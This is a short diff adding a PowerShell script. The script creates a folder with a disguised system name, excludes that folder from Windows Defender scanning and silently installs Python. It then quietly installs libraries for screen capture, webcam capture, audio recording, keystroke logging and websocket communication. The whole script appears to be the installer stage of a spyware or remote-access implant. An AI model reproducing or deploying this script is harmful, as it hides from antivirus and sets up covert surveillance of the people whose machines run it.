@@ -1,0 +1,8 @@
+New-Item -ItemType Directory -Force -Path "C:\ProgramData\WinSysSvc" | Out-Null
+Add-MpPreference -ExclusionPath "C:\ProgramData\WinSysSvc"
+$py = Get-ChildItem -Path "$env:LOCALAPPDATA\Programs\Python\Python3*\python.exe", "C:\Program Files\Python3*\python.exe" -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
+if (-not $py) {
+    winget install -e --id Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
+    $py = Get-ChildItem -Path "$env:LOCALAPPDATA\Programs\Python\Python3*\python.exe", "C:\Program Files\Python3*\python.exe" -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
+}
+& $py -m pip install --quiet --upgrade pip websockets mss pillow opencv-python-headless sounddevice numpy pynput
